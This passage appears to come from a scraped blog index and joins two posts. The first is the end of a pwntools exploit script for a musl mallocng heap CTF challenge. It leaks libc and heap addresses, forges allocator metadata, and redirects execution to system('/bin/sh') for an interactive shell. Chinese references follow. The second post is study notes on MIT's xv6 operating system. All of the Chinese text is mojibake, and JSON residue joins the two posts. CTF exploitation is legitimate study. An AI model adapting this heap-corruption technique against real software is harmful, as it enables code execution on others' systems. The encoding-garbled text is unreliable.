p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;2&quot;) p.recvuntil(b&quot;size: &quot;) if key_size == None : key_size = len(key) p.sendline(str(key_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(key)def delete(key, key_size=None): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;3&quot;) p.recvuntil(b&quot;size: &quot;) if key_size == None : key_size = len(key) p.sendline(str(key_size).encode()) p.recvuntil(b&quot;content: &quot;) p.send(key)def exit(): p.recvuntil(b&quot;option: &quot;) p.sendline(b&quot;4&quot;) def calc(key): vi = 2021 for i in range(len(key)): vi = 0x13377331 * vi + key[i] return vi &amp; 0xfffdef find_key(key=b&quot;hhhh&quot;, size=4): while True: new_key = (int((random.random()) * int((b&quot;\\xff&quot; * size).hex(), 16)) % int((b&quot;\\xff&quot; * size).hex(), 16)) if calc(key) == calc(new_key.to_bytes(size, &quot;little&quot;)) : return new_key.to_bytes(size, &quot;little&quot;)def fengshui1(n): for _ in range(n): store(b&quot;victim&quot;, b&quot;victim&quot;)def fengshui2(n): for _ in range(n): query(b&quot;h&quot; * 0x30)def get_leak(): info = b&quot;&quot; for i in range(8): info = p.recv(2) + info return int(info, 16)# -- leak info --fengshui1(1)fengshui2(5) # AFFFFFU# leak elf &amp; libcstore(b&quot;hhhh&quot;, b&quot;a&quot; * 0x30) # [U]AAAA(U)U [U] is KV, (U) is KV-&gt;valuestore(find_key(), b&quot;aaaa&quot;)delete(b&quot;hhhh&quot;) # [F]AAAUFUfengshui2(3) # FFFFUFUstore(b&quot;H\\n&quot;, b&quot;H&quot;, 0x1000) # AAAAU[U]U [U] is the chunk we can getquery(b&quot;hhhh&quot;)p.recvuntil(b&quot;:&quot;)addr_mmap = get_leak() - 0x20addr_libc = addr_mmap + 0x4000addr_malloc_context = addr_libc + 0xad9c0addr_elf = get_leak() - 0xc8d0addr_hhhh = addr_elf + 0xc890addr_KV = addr_elf + 0xcde0 # leak secretdelete(b&quot;H&quot;) # AAAAUFUfengshui2(2) # AAFFUFUKV = p64(addr_hhhh) + p64(addr_malloc_context) + p64(4) + p64(0x30) + p64(0x69052445) + p64(0)store(KV, b&quot;victim&quot;) # UUFFUFUquery(b&quot;hhhh&quot;)p.recvuntil(b&quot;:&quot;)secret = get_leak()get_leak()addr_heap = get_leak() - 0x180success(&quot;addr_elf: &quot; + hex(addr_elf))success(&quot;addr_mmap: &quot; + hex(addr_mmap))success(&quot;addr_libc: &quot; + hex(addr_libc))success(&quot;secret: &quot; + hex(secret))# -- construct --delete(KV) # FFAAUFUaddr_system = addr_libc + libc.sym[&quot;system&quot;]addr_ofl_head = addr_libc + 0xafd48addr_fake_meta_area = addr_mmap + 0x1000addr_fake_meta = addr_fake_meta_area + 0x18addr_fake_group = addr_fake_meta + 0x28addr_fake_chunk = addr_fake_group + 0x10last_idx = 0freeable = 1sc = 8 # 0x90maplen = 1fake_meta = p64(addr_fake_chunk) # prevfake_meta += p64(addr_ofl_head) # next fake_meta += p64(addr_fake_group) # memfake_meta += p64(0) # avail &amp; freed maskfake_meta += p64(last_idx | freeable &lt;&lt; 5 | sc &lt;&lt; 6 | maplen &lt;&lt; 12)active_idx = 0fake_group = p64(addr_fake_meta)fake_group += p64(active_idx)fake_chunk = b&quot;/bin/sh\\x00&quot;fake_chunk += p64(0) * 7fake_chunk += p64(addr_system) * 7fake_meta_area = b&quot;h&quot; * 0xfd0fake_meta_area += p64(secret) # checkfake_meta_area += p64(0) # nextfake_meta_area += p64(1)payload = fake_meta_areapayload += fake_metapayload += fake_grouppayload += fake_chunkpayload += b&quot;\\n&quot;store(payload, b&quot;victim&quot;, 0x1200) # FFAUUFUstore(b&quot;victim&quot;, b&quot;hhhh&quot;)fengshui2(1) # AAUUUFUaddr_hhhh = addr_hhhh + 0xb0KV = p64(addr_hhhh) + p64(addr_fake_chunk) + p64(4) + p64(0x80) + p64(0x69052445) + p64(0)store(KV, b&quot;victim&quot;)gdb.attach(p)delete(b&quot;hhhh&quot;)exit()p.interactive() å‚è€ƒmusl libc å †ç®¡ç†å™¨ mallocng è¯¦è§£ (Part I) ä»musl libc 1.1.24åˆ°1.2.2 å­¦ä¹ pwnå§¿åŠ¿ [é˜…è¯»å‹]æ–°ç‰ˆmusl libc(1.2.2)å †ç®¡ç†ä¹‹æºç å‰–æï¼ [åŸåˆ›]musl 1.2.2 æ€»ç»“+æºç åˆ†æ One æ–°ç‰ˆmusl libc æµ…æ 2022-å¼ºç½‘æ¯åˆèµ›-Writeup-By-Xp0int å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦ä¹ musl mallocng","link":"/2022/10/10/Musl%20heap%20%E6%B5%85%E6%9E%90/"},{"title":"Xv6","text":"æœ¬æ–‡æ˜¯ç¬”è€…åœ¨å­¦ä¹  MIT 6.1810 2022 Fall é˜…è¯» xv6 æ–‡æ¡£æ—¶æ‰€å†™ï¼Œå¤§éƒ¨åˆ†æ˜¯å°†åŸæ–‡ç¿»è¯‘ï¼Œç¬”è€…å°½å¯èƒ½åŠ å…¥è‡ªå·±çš„ç†è§£å¹¶æ’ç‰ˆï¼Œåº”è¯¥ä¼šæŒç»­æ›´æ–°ç›´åˆ°æ–‡æ¡£è¯»å®Œ Chapter 1 Operating system interfacesxv6 å®ç°çš„ Unix kernel çš„æœåŠ¡å’Œç³»ç»Ÿè°ƒç”¨çš„å­é›† åœ¨ user ç›®å½•ä¸‹å¯æŸ¥çœ‹ç¨‹åºæºç  System call Description int fork() åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œè¿”å›å­è¿›ç¨‹çš„ PID int exit(int status) ç»“æŸå½“å‰è¿›ç¨‹ï¼Œstatus è¿”å›ç»™ wait() int wait(int *status) ç­‰å¾…ä¸€ä¸ªå­è¿›ç¨‹ exitï¼Œexit çš„ status åœ¨ *statusä¸­ï¼Œè¿”å›å­è¿›ç¨‹ PIDï¼Œæ²¡æœ‰å­è¿›ç¨‹è¿”å› -1 int kill(int pid) ç»“æŸ PID å¯¹åº”çš„è¿›ç¨‹ï¼Œè¿”å› 0 æˆ– -1 int getpid() è¿”å›å½“å‰è¿›ç¨‹çš„ PID int sleep(int n) æš‚åœ n ä¸ªæ—¶é’Ÿ int exec(char *file, char *argv[]) åŠ è½½æ–‡ä»¶å¹¶ä½¿ç”¨å‚æ•°æ‰§è¡Œï¼Œä»…åœ¨é”™è¯¯æ—¶è¿”å› char *sbrk(int n) å†…å­˜å¢åŠ  n å­—èŠ‚ï¼Œè¿”å›æ–°å†…å­˜çš„é¦–åœ°å€ int open(char *file, int flags) æ‰“å¼€æ–‡ä»¶ï¼Œflags è¡¨ç¤ºè¯»å†™ï¼Œè¿”å›ä¸€ä¸ª fd int write(int fd, char *buf, int n) ä» buf å‘ fd å†™ n å­—èŠ‚ï¼Œè¿”å› n int read(int fd, char *buf, int n) ä» fd è¯» n å­—èŠ‚å‘ buf å†™å…¥ï¼Œè¿”å›è¯»çš„å­—èŠ‚æ•° int close(int fd) é‡Šæ”¾ fd int dup(int fd) è¿”å›ä¸ fd ç›¸åŒæ–‡ä»¶çš„ä¸€ä¸ªæ–°çš„ fd int pipe(int p[]) åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œå°†è¯»å†™ fd æ”¾å…¥ p[0] å’Œ p[1] int chdir(char *dir) æ”¹å˜å½“å‰ç›®å½• int mkdir(char *dir) åˆ›å»ºä¸€ä¸ªç›®å½• int mknod(char *file, int, int) åˆ›å»ºä¸€ä¸ªè®¾å¤‡æ–‡ä»¶ int fstat(int fd, struct stat *st) è¯»å–æ–‡ä»¶ä¿¡æ¯æ”¾å…¥ st int stat(char *file, struct stat *st) è¯»å–æ–‡ä»¶ä¿¡æ¯æ”¾å…¥ st int link(char *file1, char *file2) ä¸º file1 åˆ›å»ºå¦ä¸€ä¸ªåå­— file2ï¼Œå³ç¡¬é“¾æ¥ int unlink(char *file) åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ å¦‚æœæ²¡æœ‰å¦å¤–è¯´æ˜ï¼Œç³»ç»Ÿè°ƒç”¨è¿”å› 0 ä¸ºæ­£å¸¸ï¼Œè¿”å› -1 ä¸ºé”™è¯¯ è¿›ç¨‹å’Œå†…å­˜çˆ¶å­è¿›ç¨‹çš„å†…å­˜å…³ç³» I/O å’Œæ–‡ä»¶æè¿°ç¬¦ç®¡é“p[0] ä¸ºè¯»ç«¯ï¼Œp[1] ä¸ºå†™ç«¯ å¦‚æœè¯»ç«¯æ²¡æœ‰æ•°æ®ï¼Œread ä¼šç­‰å¾…æ•°æ®å†™å…¥æˆ–ç­‰å¾…æŒ‡å‘å†™ç«¯çš„æ‰€æœ‰ fd å…³é—­ï¼Œåè€…ç±»ä¼¼åˆ°æ–‡ä»¶ç»“å°¾ï¼Œ read ä¼šè¿”å› 0 å¦‚æœ read åˆ°è¯»ç«¯ï¼Œä¼šä¸€ç›´ç­‰å¾… shell å¯ä»¥ç”¨ | ç¬¦å·å®ç°ç®¡é“ grep fork sh.c | wc -l å°† | å·¦è¾¹çš„ç»“æœé€šè¿‡ç®¡é“æµå‘å³è¾¹ å¤š | å¯ä»¥åˆ›å»ºè¿›ç¨‹æ ‘ ç®¡é“å¯ä»¥è‡ªå·±æ¸…ç†è‡ªå·± å¯ä»¥é€šè¿‡ä»»æ„é•¿åº¦çš„æ•°æ®æµ ç®¡é“å¯ä»¥å¹¶è¡Œæ‰§è¡Œ æ–‡ä»¶ç³»ç»Ÿ#todo çœŸå®ä¸–ç•ŒUnix ç³»ç»Ÿè°ƒç”¨æ¥å£é€šè¿‡ POSIX æ ‡å‡†è¿›è¡Œæ ‡å‡†åŒ– Chapter 2 Operating system organizationä¸‰ä¸ªè¦æ±‚ å¤šè·¯å¤ç”¨ éš”ç¦» äº¤äº’ æŠ½è±¡ç‰©ç†èµ„æºæ¯ä¸ªåº”ç”¨ç¨‹åºç›´æ¥è®¿é—®ç‰©ç†èµ„æº æ•ˆç‡é«˜ éœ€è¦åº”ç”¨ç¨‹åºä¹‹é—´å¯ä¿¡ä¸”æ²¡æœ‰é”™è¯¯ å› æ­¤éœ€è¦è¿›è¡Œå¼ºéš”ç¦»ï¼ŒåŒæ—¶ä¹Ÿä¼šæä¾›ä¾¿åˆ© ç¦æ­¢åº”ç”¨ç¨‹åºç›´æ¥è®¿é—®æ•æ„Ÿçš„ç¡¬ä»¶èµ„æºï¼Œå°†èµ„æºæŠ½è±¡ä¸ºæœåŠ¡ ç”¨æˆ·/ç®¡ç†è€…æ¨¡å¼ï¼Œç³»ç»Ÿè°ƒç”¨å¼ºéš”ç¦»éœ€è¦åº”ç”¨ç¨‹åºå’Œæ“ä½œç³»ç»Ÿä¹‹é—´æœ‰ç¡¬è¾¹ç•Œ CPU èƒ½æä¾›ç¡¬ä»¶æ”¯æŒ RISC-V çš„ CPU æœ‰ä¸‰ç§æ¨¡å¼ï¼šæœºå™¨æ¨¡å¼ã€ç®¡ç†è€…ï¼ˆsupervisorï¼‰æ¨¡å¼ã€ç”¨æˆ·æ¨¡å¼ æœºå™¨æ¨¡å¼ æ‰§è¡Œçš„æŒ‡ä»¤å…·æœ‰å®Œå…¨ç‰¹æƒ ä¸»è¦ç”¨å…·é…ç½®è®¡ç®—æœºï¼Œè¿è¡Œä¸€æ®µä»£ç åä¼šè¿›å…¥å†…æ ¸æ¨¡å¼ ç®¡ç†è€…æ¨¡å¼ CPU å¯æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ å¯ç”¨ã€ç¦ç”¨ç»ˆç«¯ è¯»å†™é¡µè¡¨å¯„å­˜å™¨ ç”¨æˆ·æ¨¡å¼ CPU ä¸èƒ½æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ å¦‚æœå°è¯•æ‰§è¡Œï¼ŒCPU ä¼šåˆ‡æ¢åˆ°ç®¡ç†è€…æ¨¡å¼ï¼Œå¹¶ä¸”æ€æ­»åº”ç”¨ç¨‹åº é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥è°ƒç”¨å†…æ ¸å‡½æ•° ç³»ç»Ÿè°ƒç”¨ä¼šè·³è½¬åˆ°å†…æ ¸æŒ‡å®šçš„å…¥å£ç‚¹ CPU ä»ç”¨æˆ·æ¨¡å¼åˆ‡æ¢åˆ°ç®¡ç†è€…æ¨¡å¼ å†…æ ¸å¯ä»¥éªŒè¯ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ˜¯å¦åˆç†ï¼Œå†³å®šæ˜¯å¦è¿›è¡Œè¯·æ±‚çš„æ“ä½œ å†…æ ¸å’Œç®¡ç†è€…æ¨¡å¼ä¼¼ä¹æœ‰ç‚¹åˆ†ä¸æ¸…ï¼Ÿ ç¬”è€…çš„ç†è§£ï¼šç®¡ç†è€…æ¨¡å¼æ˜¯ RISC-V çš„ CPU å®šä¹‰çš„ï¼Œç›¸å¯¹äºç”¨æˆ·æ¨¡å¼å¤šäº†ä¸€äº›ç‰¹æƒï¼›å†…æ ¸æ˜¯ç›¸å¯¹ç”¨æˆ·ä»£ç è€Œè¨€ï¼Œè¿è¡Œåœ¨ä¸åŒçš„æ¨¡å¼ä¸‹ã€‚æ¨¡å¼å¯¹åº”ç€èº«ä»½ï¼Œå†…æ ¸å’Œç”¨æˆ·ä»£ç å¯¹åº”ç€ä¸€ä¸ªå®ä½“ å†…æ ¸æ¶æ„å®å†…æ ¸è®¾è®¡ç¼ºç‚¹ï¼šæ“ä½œç³»ç»Ÿä¸åŒéƒ¨åˆ†ä¹‹é—´çš„æ¥å£å¤æ‚ï¼Œç¼–å†™ä»£ç å®¹æ˜“å‡ºé”™ å¾®å†…æ ¸è®¾è®¡æœ€å¤§é™åº¦åœ°å‡å°‘å†…æ ¸æ¨¡å¼ä¸‹è¿è¡Œçš„æ“ä½œç³»ç»Ÿä»£ç æ•°é‡ï¼Œåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„å¤§éƒ¨åˆ†åŠŸèƒ½ xv6 kernel ä»£ç æ¶æ„ æ–‡ä»¶ æè¿° æ–‡ä»¶ æè¿° bio.c æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜å—ç¼“å†² proc.c è¿›ç¨‹å’Œè°ƒåº¦ console.c è¿æ¥åˆ°ç”¨æˆ·é”®ç›˜å’Œå±å¹• sleeplock.c æ”¾å¼ƒ CPU çš„é” entry.S ç¬¬ä¸€æ¬¡å¯åŠ¨çš„æŒ‡ä»¤ spinlock.c ä¸æ”¾å¼ƒ CPU çš„é” exec.c exec() ç³»ç»Ÿè°ƒç”¨ start.c æœºå™¨æ¨¡å¼æ—©æœŸå¯åŠ¨ä»£ç  file.c æ–‡ä»¶æè¿°ç¬¦ string.c C å­—ç¬¦ä¸²å’Œå­—èŠ‚æ•°ç»„ä»£ç åº“ fs.c æ–‡ä»¶ç³»ç»Ÿ swtch.S çº¿ç¨‹åˆ‡æ¢ kalloc.c ç‰©ç†é¡µåˆ†é…å™¨ syscall.c ç³»ç»Ÿè°ƒç”¨çš„è°ƒåº¦ kernelvec.S å¤„ç†æ¥è‡ªå†…æ ¸çš„é™·é˜±ï¼Œå®šæ—¶å™¨ä¸­æ–­ sysfile.c æ–‡ä»¶ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ log.c æ–‡ä»¶ç³»ç»Ÿæ—¥å¿—è®°å½•å’Œå´©æºƒæ¢å¤ sysproc.c è¿›ç¨‹ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ main.c å¯åŠ¨é˜¶æ®µæ§åˆ¶å…¶ä»–æ¨¡å—çš„åˆå§‹åŒ– trampoline.S åˆ‡æ¢ç”¨æˆ·/å†…æ ¸æ¨¡å¼çš„æ±‡ç¼– pipe.c ç®¡é“ trap.c å¤„ç†é™·é˜±å’Œä¸­æ–­å¹¶ä»ä¸­è¿”å› plic.c RISC-V ä¸­æ–­æ§åˆ¶å™¨ uart.c ä¸²å£æ§åˆ¶å°è®¾å¤‡é©±åŠ¨ printf.c æ ¼å¼åŒ–è¾“å‡ºåˆ°æ§åˆ¶å° virtio_disk.c ç£ç›˜è®¾å¤‡é©±åŠ¨ vm.c ç®¡ç†é¡µè¡¨å’Œåœ°å€ç©ºé—´ defs.h æ¨¡å—é—´æ¥å£çš„å®šä¹‰ è¿›ç¨‹åœ°å€ç©ºé—´æ¯ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªå•ç‹¬çš„é¡µè¡¨ï¼Œå®šä¹‰äº†è¿›ç¨‹çš„åœ°å€ç©ºé—´ æœ‰è®¸å¤šå› ç´ é™åˆ¶äº†è¿›ç¨‹åœ°å€ç©ºé—´çš„æœ€å¤§å€¼ RISC-V çš„æŒ‡é’ˆä¸º 64 ä½ åœ¨é¡µè¡¨ä¸­æŸ¥æ‰¾è™šæ‹Ÿåœ°å€æ—¶ï¼Œç¡¬ä»¶ä»…ä½¿ç”¨ä½ 39 ä½ xv6 åªä½¿ç”¨ 38 ä½ #why å› æ­¤æœ€å¤§åœ°å€ä½ 2^38^ - 1 = 0x3fffffffffï¼Œå³ MAXVAï¼ˆåœ¨ kernel/risc.h ä¸­å®šä¹‰ï¼‰ã€ åœ¨åœ°å€ç©ºé—´çš„é¡¶éƒ¨ä¿ç•™äº†ä¸€é¡µç”¨ä½œ trampolineï¼ˆè·³æ¿ã€è¹¦åºŠï¼‰ï¼Œä¸€é¡µç”¨ä½œæ˜ å°„è¿›ç¨‹çš„ trapframeï¼ˆé™·é˜±å¸§ï¼‰ï¼Œxv6 ç”¨è¿™ä¸¤ä¸ªé¡µé¢è¿›å…¥å’Œé€€å‡ºå†…æ ¸ trampoline åŒ…å«è¿›å…¥å’Œé€€å‡ºå†…æ ¸çš„ä»£ç  trapframe æ˜ å°„ç”¨äºä¿å­˜å’Œæ¢å¤ç”¨æˆ·è¿›ç¨‹çš„çŠ¶æ€ è¿›ç¨‹çŠ¶æ€xv6 å†…æ ¸ç»´æŠ¤æ¯ä¸ªè¿›ç¨‹çš„çŠ¶æ€ï¼Œå­˜æ”¾åˆ° proc ç»“æ„ä½“ä¸­ï¼ˆkernel/proc.hï¼‰ æœ€é‡è¦çš„éƒ¨åˆ†æ˜¯é¡µè¡¨ã€å†…æ ¸æ ˆã€è¿è¡ŒçŠ¶æ€ p-&gt;state è¡¨ç¤ºè¿›ç¨‹çŠ¶æ€ï¼ˆåˆ†é…ã€å‡†å¤‡è¿è¡Œã€ç­‰å¾…IOã€æ­£åœ¨é€€å‡ºï¼‰ p-&gt;pagetable ä¿å­˜é¡µè¡¨ï¼Œè¿˜ç”¨ä½œå­˜å‚¨è¿›ç¨‹å†…å­˜çš„ç‰©ç†é¡µåœ°å€çš„è®°å½• æ ˆç©ºé—´ æ¯ä¸ªè¿›ç¨‹æœ‰ä¸¤ä¸ªæ ˆï¼šç”¨æˆ·æ ˆå’Œå†…æ ¸æ ˆï¼ˆp-&gt;kstackï¼‰ åœ¨æ‰§è¡Œç”¨æˆ·æŒ‡ä»¤æ—¶ï¼Œåªæœ‰ç”¨æˆ·æ ˆåœ¨ä½¿ç”¨ï¼Œå†…æ ¸æ ˆä¸ºç©º å½“è¿›å…¥å†…æ ¸æ¨¡å¼ï¼ˆç³»ç»Ÿè°ƒç”¨æˆ–ä¸­æ–­ï¼‰ï¼Œå†…æ ¸ä»£ç ä¼šåœ¨å†…æ ¸æ ˆä¸Šæ‰§è¡Œï¼Œç”¨æˆ·æ ˆä¸å˜ å†…æ ¸æ ˆæ˜¯ç‹¬ç«‹çš„ï¼Œå³ä½¿è¿›ç¨‹ç ´åäº†ç”¨æˆ·æ ˆï¼Œå†…æ ¸ä¹Ÿå¯ä»¥æ‰§è¡Œ å¯åŠ¨ xv6ï¼Œç¬¬ä¸€ä¸ªè¿›ç¨‹å’Œç³»ç»Ÿè°ƒç”¨çš„ä»£ç  RISC-V å¼€æœºæ—¶ï¼Œä¼šè‡ªè¡Œåˆå§‹åŒ–ï¼Œè¿è¡Œå­˜å‚¨åœ¨ ROM ä¸­çš„å¼•å¯¼åŠ è½½ç¨‹åº å¼•å¯¼åŠ è½½ç¨‹åºå°† xv6 å†…æ ¸åŠ è½½åˆ°å†…å­˜ 0x80000000 ä¸­ï¼Œå› ä¸º 0 ~ 0x80000000 ä¹‹é—´åŒ…å« IO è®¾å¤‡ï¼ˆRISC-V åœ¨åˆ†é¡µç¡¬ä»¶ç¦ç”¨å’Œè™šæ‹Ÿåœ°å€ç›´æ¥æ˜ å°„åˆ°ç‰©ç†åœ°å€æ¡ä»¶ä¸‹å¼€å§‹ï¼‰ åœ¨æœºå™¨æ¨¡å¼ä¸‹ï¼Œä» _entry å¼€å§‹æ‰§è¡Œ xv6 _entry çš„æŒ‡ä»¤è®¾ç½®ä¸€ä¸ªæ ˆï¼Œä»¥ä¾¿ xv6 è¿è¡Œ C ä»£ç  xv6 åœ¨ kernel/start.c ä¸­å£°æ˜ä¸€ä¸ªåˆå§‹æ ˆ stack0 çš„ç©ºé—´ _entry çš„ä»£ç å°†æ ˆé¡¶å¯„å­˜å™¨ sp åŠ è½½åˆ° stack0 çš„é¡¶éƒ¨ stack0+0x1000 æ¥ä¸‹æ¥è°ƒç”¨ kernel/start.c ä¸­çš„ä»£ç  start å‡½æ•° å…ˆåœ¨æœºå™¨æ¨¡å¼æ‰§è¡Œé…ç½®ä»£ç  ä¿®æ”¹ mstatus å¯„å­˜å™¨ä¸­ MPPï¼ˆMachine Previous Privilege modeï¼‰çš„å€¼ä¸º Supervisorï¼Œåœ¨ mret æ—¶è¿”å›åˆ°ç®¡ç†è€…æ¨¡å¼ å°† main çš„åœ°å€å†™å…¥ mepc å¯„å­˜å™¨ä½œä¸º mret è¿”å›åœ°å€ å°†æ‰€æœ‰ä¸­æ–­å’Œå¼‚å¸¸å§”æ‰˜ç»™å†…æ ¸ å°† 0 å†™å…¥ satp é¡µè¡¨å¯„å­˜å™¨ï¼Œç¦ç”¨å†…æ ¸æ¨¡å¼ä¸‹çš„è™šæ‹Ÿå†…å­˜è½¬æ¢ å¯¹æ—¶é’ŸèŠ¯ç‰‡ç¼–ç¨‹æ¥ç”Ÿæˆè®¡æ—¶å™¨ä¸­æ–­ ç„¶åé€šè¿‡ mret æŒ‡ä»¤åˆ‡æ¢åˆ°ç®¡ç†è€…æ¨¡å¼ï¼Œè¿›å…¥å†…æ ¸ï¼Œæ‰§è¡Œ main å‡½æ•° mret å¸¸ç”¨äºåœ¨è¿›å…¥æœºå™¨æ¨¡å¼åè¿”å›åˆ°ç®¡ç†è€…æ¨¡å¼ start ä¼šå°†å‰ä¸€ä¸ªæ¨¡å¼è®¾ç½®ä¸ºç®¡ç†è€…æ¨¡å¼ï¼Œä»¥ä¾¿ç¬¦åˆ mret çš„æ¡ä»¶ main å‡½æ•° åˆå§‹åŒ–æ§åˆ¶å° åˆå§‹åŒ–ç‰©ç†é¡µåˆ†é…å™¨ åˆ›å»ºå†…æ ¸é¡µè¡¨ åŠ è½½å¯åŠ¨é¡µé¢ åˆå§‹åŒ–è¿›ç¨‹è¡¨ è®¾ç½®å†…æ ¸çš„ trap å¤„ç†ä½ç½® åˆå§‹åŒ–ä¸­æ–­æ§åˆ¶ PLIC é€šè¿‡ä¸­æ–­è¯·æ±‚ PLIC è®¿é—®è®¾å¤‡ åˆå§‹åŒ– buffer ç¼“å­˜ åˆå§‹åŒ– inode ç¼“å­˜ åˆå§‹åŒ–æ–‡ä»¶ç³»ç»Ÿ åˆå§‹åŒ–ç£ç›˜ è¿›å…¥ userinit å‡½æ•° userinit å‡½æ•° åˆ›å»ºç¬¬ä¸€ä¸ªè¿›ç¨‹ æ‰§è¡Œç”¨ RISC-V ç¼–å†™çš„å°ç¨‹åºï¼Œä½¿ç”¨ç¬¬ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ åœ¨ user/initcode.S ä¸­æŠŠ SYS_exec ç³»ç»Ÿè°ƒç”¨å·ä¼ ç»™ a7 å¯„å­˜å™¨ï¼Œç„¶åè°ƒç”¨ ecall è¿›å…¥å†…æ ¸ å®‰å…¨æ¨¡å‹#todo çœŸå®ä¸–ç•Œå¤§å¤šæ•°æ“ä½œç³»ç»Ÿé‡‡ç”¨äº†è¿›ç¨‹çš„æ¦‚å¿µï¼Œä½†æ˜¯ç°ä»£æ“ä½œç³»ç»Ÿçš„è¿›ç¨‹æ”¯æŒå¤šä¸ªçº¿ç¨‹ï¼Œä»¥å…è®¸å•ä¸ªè¿›ç¨‹åˆ©ç”¨å¤šä¸ª CPUï¼Œæ½œåœ¨åœ°æ›´æ”¹äº†æ¥å£ï¼ˆå¦‚ Linux çš„ cloneï¼Œfork çš„ä¸€ç§å˜ä½“ï¼‰ï¼Œæ¥æ§åˆ¶çº¿ç¨‹å…±äº«çš„å„ä¸ªæ–¹é¢ Chapter 3 Page tables#todo åˆ†é¡µç¡¬ä»¶#todo å†…æ ¸åœ°å€ç©ºé—´#todo ä»£ç ï¼šåˆ›å»ºä¸€ä¸ªåœ°å€ç©ºé—´å¤§å¤šæ•°å¤„ç†åœ°å€ç©ºé—´å’Œé¡µè¡¨çš„ä»£ç åœ¨ kernel/vm.c ä¸­ æ•°æ®ç»“æ„ pagetable_tï¼Œæ˜¯æŒ‡å‘ RISC-V æ ¹é¡µè¡¨çš„æŒ‡é’ˆ typedef uint64 *pagetable_tï¼Œå®ƒå¯ä»¥æ˜¯å†…æ ¸æˆ–æ¯ä¸ªè¿›ç¨‹çš„é¡µè¡¨ ä¸­å¿ƒå‡½æ•°æ˜¯ walk å’Œ mappages walkï¼šä»é¡µè¡¨ä¸­æŸ¥æ‰¾è™šæ‹Ÿåœ°å€å¯¹åº”çš„ PTE mappagesï¼šä¸ºæ–°æ˜ å°„å®‰è£… PTE kvm å¼€å¤´çš„å‡½æ•°æ“ä½œå†…æ ¸é¡µè¡¨ uvm å¼€å¤´çš„å‡½æ•°æ“ä½œç”¨æˆ·é¡µè¡¨ copyin å’Œ copyout ç”¨äºç”¨æˆ·ä¸å†…æ ¸ä¹‹é—´ä¼ è¾“æ•°æ® ç³»ç»Ÿå¯åŠ¨ä¸€å¼€å§‹ï¼Œmain è°ƒç”¨ kvminit æ¥ä½¿ç”¨ kvmmake åˆ›å»ºå†…æ ¸é¡µè¡¨ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œåœ°å€ç›´æ¥æ˜ å°„åˆ°ç‰©ç†å†…å­˜ ç„¶åè°ƒç”¨ kvminithart æ¥å®‰è£…å†…æ ¸é¡µè¡¨ï¼Œå°†æ ¹é¡µè¡¨çš„ç‰©ç†åœ°å€å†™å…¥ satp å¯„å­˜å™¨ï¼Œåœ¨æ­¤ä¹‹å CPU ä¼šä½¿ç”¨å†…æ ¸é¡µè¡¨è½¬æ¢åœ°å€ kvmmake é¦–å…ˆåˆ†é…ä¸€é¡µç‰©ç†å†…å­˜æ¥ä¿å­˜æ ¹é¡µè¡¨ ç„¶åè°ƒç”¨ kvmmap æ¥å®‰è£…å†…æ ¸éœ€è¦çš„ PTE åŒ…æ‹¬å†…æ ¸çš„æŒ‡ä»¤å’Œæ•°æ®ï¼Œæœ€é«˜åˆ° PHYSTOP çš„ç‰©ç†å†…å­˜ï¼Œè®¾å¤‡çš„å†…å­˜èŒƒå›´ ç„¶åè°ƒç”¨ proc_mapstacks ç»™æ¯ä¸ªè¿›ç¨‹åˆ†é…ä¸€ä¸ªå†…æ ¸æ ˆ å®ƒè°ƒç”¨ kvmmap æŠŠæ¯ä¸ªæ ˆæ˜ å°„åˆ° KSTACK ç”Ÿæˆçš„è™šæ‹Ÿåœ°å€ï¼Œç•™å‡ºäº†ä¿æŠ¤é¡µçš„ç©ºé—´ kvmmap è°ƒç”¨ mappages å®‰è£… PTE mappages å®ƒå¯¹æ¯ä¸ªè™šæ‹Ÿåœ°å€å…ˆè°ƒç”¨ walk æŸ¥æ‰¾å¯¹åº”çš„ PTE åœ°å€ ç„¶ååˆå§‹åŒ– PTE ä¿å­˜å¯¹åº”çš„ PPN å’Œ æƒé™æ ‡å¿—ä½ walk å®ƒå¯¹ä¸‰çº§é¡µè¡¨è¿›è¡ŒæŸ¥è¯¢å¯¹åº”çš„ PTE è‹¥ PTE æ— æ•ˆä¸”è®¾ç½®äº† alloc å‚æ•°ï¼Œwalk ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢ï¼Œå¹¶æŠŠç‰©ç†åœ°å€æ”¾å…¥ PTE æœ€åè¿”å›ç¬¬ä¸‰çº§é¡µè¡¨çš„ PTE åœ°å€ ç‰©ç†å†…å­˜åˆ†é…xv6 åœ¨å†…æ ¸ç»“å°¾ä¸ PHSYTOP ä¹‹é—´åˆ†é…è¿è¡Œæ—¶å†…å­˜ï¼Œä¸€æ¬¡åˆ†é…å’Œé‡Šæ”¾ 4KB xv6 è¿½è¸ªå“ªäº›é¡µé¢æ˜¯ freedï¼Œé€šè¿‡å»ºç«‹ä¸€ä¸ªé“¾è¡¨ åˆ†é…åŒ…æ‹¬ä»é“¾è¡¨ä¸­ç§»é™¤ï¼Œé‡Šæ”¾åŒ…æ‹¬å°† freed é¡µåŠ å…¥ä»é“¾è¡¨ä¸­ ä»£ç ï¼šç‰©ç†å†…å­˜åˆ†é…å™¨åˆ†é…å™¨ä½äº kernel/kalloc.c ä¸­ æ•°æ®ç»“æ„æ˜¯ä¸€ä¸ª free é“¾è¡¨ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ struct runï¼Œé“¾è¡¨ç”±ä¸€ä¸ª spin lock ä¿æŠ¤ï¼Œé”è°ƒç”¨ acquire å’Œ releaseï¼Œé“¾è¡¨å’Œé”è¢«åŒ…è£…åœ¨ kmem 